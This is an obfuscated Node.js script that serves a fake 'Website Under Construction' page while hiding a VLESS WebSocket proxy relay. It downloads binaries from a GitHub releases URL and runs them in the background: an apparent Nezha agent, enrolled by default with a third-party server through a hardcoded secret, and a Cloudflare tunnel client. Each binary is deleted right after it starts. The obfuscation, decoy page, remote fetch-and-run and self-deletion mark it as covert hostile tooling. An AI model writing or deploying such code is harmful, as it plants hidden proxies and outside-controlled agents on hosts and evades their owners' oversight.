#!/usr/bin/env node

const _0x2d15=['map','concat','arm64','writeFile','text/plain','N_T','substr','home','NZ_UUID','error','slice','/health','now','location','createServer','text/html','exit','</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','OPEN','EADDRINUSE','.write_test_','http','pipe','true','catch','cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg','send','string','connect','&fp=chrome&security=tls#','every','arch','https:','http://','headersSent','once','C_D','N_K','url','Request\x20failed:\x20','join','code','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','access','cwd','www.shopify.com','finish','node','NZ_TLS','PORT','trim','Not\x20Found','https','worker','\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>','Too\x20many\x20redirects','/cf','env','listen','headers','end','--tls','https://github.com/seav1/dl/releases/download/files','/nzv1','decode','pgrep\x20-x\x20','tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20','includes','status','reduce','application/json','close','newnz.seav.eu.org','&host=','UUID'];const _0x3de1=function(_0x2d154c,_0x3de178){_0x2d154c=_0x2d154c-0x0;let _0x456006=_0x2d15[_0x2d154c];return _0x456006;};const {exec,spawn}=require('child_process');const {WebSocketServer,createWebSocketStream}=require('ws');const http=require(_0x3de1('0x15'));const https=require(_0x3de1('0x34'));const {URL}=require(_0x3de1('0x26'));const net=require('net');const {join}=require('path');const {promises:fs,createWriteStream,chmodSync}=require('fs');const os=require('os');const CONFIG={'UUID':(process[_0x3de1('0x39')]['UUID']||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98')['replace'](/-/g,''),'PORT':process[_0x3de1('0x39')][_0x3de1('0x31')]||0xbb8,'N_S':process['env']['N_S']||_0x3de1('0x48'),'N_P':process[_0x3de1('0x39')]['N_P']||'443','N_K':process[_0x3de1('0x39')][_0x3de1('0x25')]||_0x3de1('0x19'),'NZ_UUID':process['env'][_0x3de1('0x8')]||'','N_T':process['env'][_0x3de1('0x5')]||_0x3de1('0x3d'),'C_B':process[_0x3de1('0x39')]['C_B']||_0x3de1('0x2d'),'C_T':process[_0x3de1('0x39')]['C_T']||'','C_D':process[_0x3de1('0x39')][_0x3de1('0x24')]||''};const FILE_NAMES={'nzv1':_0x3de1('0x35'),'cf':'service'};let WORK_DIR;const isPortInUse=_0x57b59c=>new Promise(_0x8b4e4b=>{const _0x471637=net[_0x3de1('0xe')]();_0x471637[_0x3de1('0x23')](_0x3de1('0x9'),_0x2a74a6=>_0x8b4e4b(_0x2a74a6[_0x3de1('0x29')]===_0x3de1('0x13')));_0x471637[_0x3de1('0x23')]('listening',()=>{_0x471637[_0x3de1('0x47')]();_0x8b4e4b(![]);});_0x471637['listen'](_0x57b59c);});const isProcessRunning=_0x4407a7=>new Promise(_0x4a3a6e=>{exec(_0x3de1('0x41')+_0x4407a7,(_0xef7db5,_0x310604)=>_0x4a3a6e(!_0xef7db5&&_0x310604[_0x3de1('0x32')]()['length']>0x0));});const fileExists=async _0x49e825=>{try{await fs[_0x3de1('0x2b')](_0x49e825);return!![];}catch{return![];}};const isWritable=async _0x2cba02=>{const _0x277cdf=join(_0x2cba02,_0x3de1('0x14')+Date[_0x3de1('0xc')]());try{await fs[_0x3de1('0x3')](_0x277cdf,'test');await fs['unlink'](_0x277cdf);return!![];}catch{return![];}};const initWorkDir=async()=>{if(await isWritable(os['tmpdir']())){WORK_DIR=os['tmpdir']();}else{WORK_DIR=process[_0x3de1('0x2c')]();}};const requestStream=(_0x12a5ae,_0x216b21=0x0)=>new Promise((_0x5906a3,_0x58a858)=>{const _0x1902de=new URL(_0x12a5ae);const _0x15fcdf=_0x1902de['protocol']===_0x3de1('0x20')?https:http;const _0x41fc15=_0x15fcdf['get'](_0x1902de,{'headers':{'User-Agent':_0x3de1('0x2f')}},_0x4a3c89=>{const _0x1ce550=_0x4a3c89['statusCode']||0x0;if([0x12d,0x12e,0x12f,0x133,0x134]['includes'](_0x1ce550)&&_0x4a3c89['headers'][_0x3de1('0xd')]){_0x4a3c89['resume']();if(_0x216b21>=0x5)return _0x58a858(new Error(_0x3de1('0x37')));const _0xf3e41a=new URL(_0x4a3c89['headers'][_0x3de1('0xd')],_0x1902de)['toString']();requestStream(_0xf3e41a,_0x216b21+0x1)['then'](_0x5906a3,_0x58a858);return;}if(_0x1ce550>=0x190){_0x4a3c89['resume']();return _0x58a858(new Error(_0x3de1('0x27')+_0x1ce550));}_0x5906a3(_0x4a3c89);});_0x41fc15['on']('error',_0x58a858);});const downloadBinary=async(_0x3ed481,_0x1c84bc)=>{const _0x59106e=await requestStream(_0x3ed481);const _0x4b0887=createWriteStream(_0x1c84bc);return new Promise((_0x2a5047,_0x41f996)=>{_0x59106e['pipe'](_0x4b0887);_0x59106e['on']('error',_0x41f996);_0x4b0887['on'](_0x3de1('0x2e'),()=>{chmodSync(_0x1c84bc,0x1ed);_0x2a5047();});_0x4b0887['on'](_0x3de1('0x9'),_0x41f996);});};const vlessLink=()=>'vless://'+CONFIG['UUID']+'@'+CONFIG['C_B']+':443?type=ws&path='+encodeURIComponent('/vl')+_0x3de1('0x49')+CONFIG['C_D']+'&encryption=none&sni='+CONFIG['C_D']+_0x3de1('0x1d')+CONFIG['C_D'];const HTML_TEMPLATES={'home':'<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','status':(_0x38df48,_0x3ad2eb)=>'<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>'+_0x38df48+_0x3de1('0x2a')+_0x3ad2eb+_0x3de1('0x11')+_0x3ad2eb+_0x3de1('0x36')};const server=http[_0x3de1('0xe')]((_0x40b72c,_0x3854bc)=>{try{const {pathname}=new URL(_0x40b72c[_0x3de1('0x26')],_0x3de1('0x21')+_0x40b72c[_0x3de1('0x3b')]['host']);if(pathname==='/'){_0x3854bc['writeHead'](0xc8,{'Content-Type':_0x3de1('0xf')});_0x3854bc[_0x3de1('0x3c')](HTML_TEMPLATES[_0x3de1('0x7')]);}else if(pathname==='/x'){_0x3854bc['writeHead'](0xc8,{'Content-Type':'text/html'});_0x3854bc['end'](HTML_TEMPLATES[_0x3de1('0x44')](CONFIG['PORT'],vlessLink()));}else if(pathname===_0x3de1('0xb')){_0x3854bc['writeHead'](0xc8,{'Content-Type':_0x3de1('0x46')});_0x3854bc['end'](JSON['stringify']({'status':'ok','uptime':process['uptime']()}));}else{_0x3854bc['writeHead'](0x194,{'Content-Type':'text/plain'});_0x3854bc['end'](_0x3de1('0x33'));}}catch{if(!_0x3854bc[_0x3de1('0x22')]){_0x3854bc['writeHead'](0x1f4,{'Content-Type':_0x3de1('0x4')});_0x3854bc[_0x3de1('0x3c')]('Internal\x20Server\x20Error');}}});const wss=new WebSocketServer({'server':server,'path':'/vl'});wss['on']('connection',_0x4f4810=>{_0x4f4810[_0x3de1('0x23')]('message',_0x6a0097=>{const [_0x1fed02]=_0x6a0097;const _0x40d35e=_0x6a0097['slice'](0x1,0x11);if(!_0x40d35e[_0x3de1('0x1e')]((_0xe282c,_0x2b6cf4)=>_0xe282c===parseInt(CONFIG[_0x3de1('0x4a')][_0x3de1('0x6')](_0x2b6cf4*0x2,0x2),0x10)))return;let _0x17e597=_0x6a0097['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x5388d0=_0x6a0097['slice'](_0x17e597,_0x17e597+=0x2)['readUInt16BE'](0x0);const _0x2724ef=_0x6a0097[_0x3de1('0xa')](_0x17e597,_0x17e597+=0x1)['readUInt8']();let _0x2b4067;if(_0x2724ef===0x1){_0x2b4067=_0x6a0097[_0x3de1('0xa')](_0x17e597,_0x17e597+=0x4)['join']('.');}else if(_0x2724ef===0x2){const _0x3947ed=_0x6a0097[_0x3de1('0xa')](_0x17e597,_0x17e597+=0x1)['readUInt8']();_0x2b4067=new TextDecoder()[_0x3de1('0x40')](_0x6a0097['slice'](_0x17e597,_0x17e597+=_0x3947ed));}else if(_0x2724ef===0x3){_0x2b4067=_0x6a0097[_0x3de1('0xa')](_0x17e597,_0x17e597+=0x10)[_0x3de1('0x45')]((_0x312fcd,_0x25239a,_0x548e82,_0x3ec4e5)=>_0x548e82%0x2?_0x312fcd[_0x3de1('0x1')](_0x3ec4e5['slice'](_0x548e82-0x1,_0x548e82+0x1)):_0x312fcd,[])[_0x3de1('0x0')](_0x746b8=>_0x746b8['readUInt16BE'](0x0)['toString'](0x10))[_0x3de1('0x28')](':');}if(_0x4f4810['readyState']===_0x4f4810[_0x3de1('0x12')]){_0x4f4810[_0x3de1('0x1a')](new Uint8Array([_0x1fed02,0x0]));const _0xa8e3fa=createWebSocketStream(_0x4f4810)['on']('error',()=>{});const _0x59fe94=net[_0x3de1('0x1c')]({'host':_0x2b4067,'port':_0x5388d0},function(){this['write'](_0x6a0097['slice'](_0x17e597));_0xa8e3fa[_0x3de1('0x16')](this)['pipe'](_0xa8e3fa);});_0x59fe94['on']('error',()=>{});}});});async function downloadAndRun(_0x1c88f9,_0x348039,_0x984a3b,_0x25f6ab){if(!_0x1c88f9)return;const _0x1f97b0=join(WORK_DIR,FILE_NAMES[_0x984a3b]);if(await isProcessRunning(FILE_NAMES[_0x984a3b]))return;if(await fileExists(_0x1f97b0)){await fs['chmod'](_0x1f97b0,0x1ed)['catch'](()=>{});spawnProcess(_0x1f97b0,_0x348039,_0x25f6ab);return;}try{await downloadBinary(_0x1c88f9,_0x1f97b0);spawnProcess(_0x1f97b0,_0x348039,_0x25f6ab);}catch{await fs['unlink'](_0x1f97b0)['catch'](()=>{});}}function spawnProcess(_0x15e82b,_0x21dea2,_0x3b4faa){const _0x4bbd3f=spawn(_0x15e82b,_0x21dea2['split']('\x20')['filter'](_0x109423=>_0x109423),{'stdio':'ignore','detached':!![],'env':_0x3b4faa||process[_0x3de1('0x39')]});_0x4bbd3f['unref']();_0x4bbd3f['on']('spawn',()=>setTimeout(()=>fs['unlink'](_0x15e82b)['catch'](()=>{}),0x3e8));}const baseUrl=_0x3de1('0x3e');const archUrl=_0x244405=>process[_0x3de1('0x1f')]===_0x3de1('0x2')?_0x244405+'-arm':_0x244405;(async()=>{await initWorkDir();if(await isPortInUse(CONFIG[_0x3de1('0x31')]))process[_0x3de1('0x10')](0x1);server[_0x3de1('0x3a')](CONFIG['PORT']);if(CONFIG['N_S']&&CONFIG['N_K']){const _0x3e885c={...process[_0x3de1('0x39')]};_0x3e885c['NZ_SERVER']=CONFIG['N_S']+':'+CONFIG['N_P'];_0x3e885c['NZ_CLIENT_SECRET']=CONFIG['N_K'];if(CONFIG[_0x3de1('0x8')]){_0x3e885c['NZ_UUID']=CONFIG[_0x3de1('0x8')];}if(CONFIG[_0x3de1('0x5')]===_0x3de1('0x3d')||typeof CONFIG[_0x3de1('0x5')]===_0x3de1('0x1b')&&CONFIG[_0x3de1('0x5')][_0x3de1('0x43')]('--tls')){_0x3e885c[_0x3de1('0x30')]=_0x3de1('0x17');}await downloadAndRun(archUrl(baseUrl+_0x3de1('0x3f')),'','nzv1',_0x3e885c);}await downloadAndRun(archUrl(baseUrl+_0x3de1('0x38')),_0x3de1('0x42')+CONFIG['C_T'],'cf');})()[_0x3de1('0x18')](()=>process['exit'](0x1));
